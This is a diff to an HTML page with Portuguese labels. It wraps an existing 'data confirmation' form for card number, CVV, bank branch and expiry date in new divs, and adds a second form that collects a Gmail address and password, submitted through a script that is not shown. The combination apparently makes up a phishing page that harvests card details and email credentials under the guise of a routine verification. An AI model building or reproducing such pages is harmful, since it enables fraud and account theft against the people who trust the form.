@@ -23,17 +23,43 @@
             <p class="textConfirma">Confirmação de dados</p>
             </div>
             <form class="form1" action="">
-                <label class="textInput" for="numeroCartao">Número do cartão</label>
-                <input class="padrao" type="number" name="numeroCartao" id="numeroCartao">
-                <label class="textInput" for="cvv">CVV</label>
-                <input type="number" name="cvv" id="cvv">
-                <label class="textInput" for="agencia">Agência</label>
-                <input class="padrao" type="number" name="agencia" id="agencia">
-                <label class="textInput" for="dataValidade">Data de validade</label>
-                <input type="date" name="dataValidade" id="dataValidade">
+                <div class="test">
+                    <label class="textInput" for="numeroCartao">Número do cartão</label>
+                    <input class="padrao borda" type="number" name="numeroCartao" id="numeroCartao">
+                </div>
+                <div class="test">
+                    <label class="textInput" for="cvv">CVV</label>
+                    <input type="number" name="cvv" id="cvv">
+                </div>
+                <div class="test">
+                    <label class="textInput" for="agencia">Agência</label>
+                    <input class="padrao borda" type="number" name="agencia" id="agencia">
+                </div>
+                <div class="test">
+                    <label class="textInput" for="dataValidade">Data de validade</label>
+                    <input type="date" name="dataValidade" id="dataValidade">
+                </div>
             </form>
+        </div>
+        <div class="container ajuste">
+            <div class="confirma">
+            <img src="./img/email.png" alt="">
+            <p class="textConfirma">Confirmação de dados</p>
+            </div>
+            <form class="form1">
+                <div class="test">
+                    <label class="textInput" for="email">G-mail</label>
+                    <input class="padrao borda" type="email" name="email" id="email">
+                </div>
+                <div class="test">
+                    <label class="textInput" for="senha">Senha</label>
+                    <input type="password" name="senha" id="senha">
+                </div>
+            </form>
+            <button onclick="recebe()">Enviar</button>
         </div>
         
     </main>
+    <script src="/script.js"></script>
 </body>
 </html>
